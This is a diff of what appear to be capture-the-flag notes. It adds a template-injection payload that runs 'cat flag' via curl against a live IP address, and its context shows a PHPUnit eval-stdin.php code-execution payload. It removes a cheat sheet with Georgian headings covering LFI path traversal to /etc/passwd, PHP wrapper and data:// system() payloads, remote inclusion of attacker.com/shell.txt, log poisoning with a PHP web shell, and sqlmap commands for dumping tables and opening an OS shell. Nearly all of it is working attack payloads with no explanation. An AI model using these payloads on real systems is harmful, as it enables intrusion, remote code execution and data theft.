@@ -35,6 +35,12 @@
 
 curl -X POST --data '<?php system("cat /flag.txt"); ?>' http://35.246.139.54:31380/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 
+
+14. SHARK - curl -X POST http://34.40.24.84:31426 \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  --data-urlencode "name=<% import os %><% x=os.popen('cat flag').read() %>\${x}"
+
+
 14
 
 
@@ -56,53 +62,3 @@ puzzled)
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-საბაზისო LFI:
-
-http://example.com/?page=../../../../etc/passwd
-http://example.com/?file=file:///etc/passwd
-PHP Wrapper-ები:
-
-http://example.com/?page=php://filter/convert.base64-encode/resource=index.php
-http://example.com/?page=data://text/plain,<?php system("id"); ?>
-RFI (Remote File Inclusion):
-
-http://example.com/?page=http://attacker.com/shell.txt
-Log Poisoning (Apache/Nginx):
-
-curl "http://example.com" -H "User-Agent: <?php system($_GET['cmd']); ?>"
-http://example.com/?page=/var/log/apache2/access.log&cmd=id
-
-
-sqlmap -u "http://example.com/?id=1" --dbs
-sqlmap -u "http://example.com/?id=1" -D database_name --tables
-sqlmap -u "http://example.com/?id=1" -D database_name -T users --dump
-sqlmap -u "http://example.com/?id=1" --os-shell
